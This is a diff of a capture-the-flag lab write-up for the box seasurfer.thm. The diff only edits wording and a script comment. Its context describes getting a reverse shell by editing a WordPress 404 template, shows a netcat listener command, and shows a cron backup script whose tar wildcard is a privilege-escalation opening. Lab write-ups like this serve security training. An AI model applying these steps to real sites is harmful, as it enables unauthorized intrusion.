@@ -273,7 +273,7 @@ It took us a whopping 8 seconds, and our **Kali** machine isn't even that beefy!
 ![Pasted image 20220419133823.png](attachments/Pasted%20image%2020220419133823.png)
 
 
-Instead of defacing the website or doing anything nasty to their customers, let's get a reverse shell going. **WordPress** is almost notorius for it's (admin) RCE capability by default. Some people use `metasploit` for this, but we'll do it manually by uploading the classic **PentestMonkey PHP reverse shell** to the `404` page via **Appearance -> Theme File Editor -> 404 Template**. Let's save and visit any non-existing page, such as `http://seasurfer.thm/wowwhatagreatbox` to activate the reverse shell in the `404` template:
+Instead of defacing the website or doing anything nasty to their customers, let's get a reverse shell going. **WordPress** is almost notorius for it's (admin) **RCE** capability by default. Some people use `metasploit` for this, but we'll do it manually by uploading the classic **PentestMonkey PHP reverse shell** to the `404` page via **Appearance -> Theme File Editor -> 404 Template**. Let's save and visit any non-existing page, such as `http://seasurfer.thm/wowwhatagreatbox` to activate the reverse shell in the `404` template:
 
 ```zsh
 lassi@kali:~$ nc -lvnp 1234        
@@ -302,7 +302,7 @@ www-data@seasurfer:/var/www/internal/maintenance$ cat backup.sh
 #!/bin/bash
 
 # Brandon complained about losing _one_ receipt when we had 5 minutes of downtime, set this to run every minute now >:D
-# Still need to come up with a better backup system, perhaps a cloud provider?
+# TODO investigate the reason for the downtime. Need a debugger...
 
 cd /var/www/internal/invoices
 tar -zcf /home/kyle/backups/invoices.tgz *
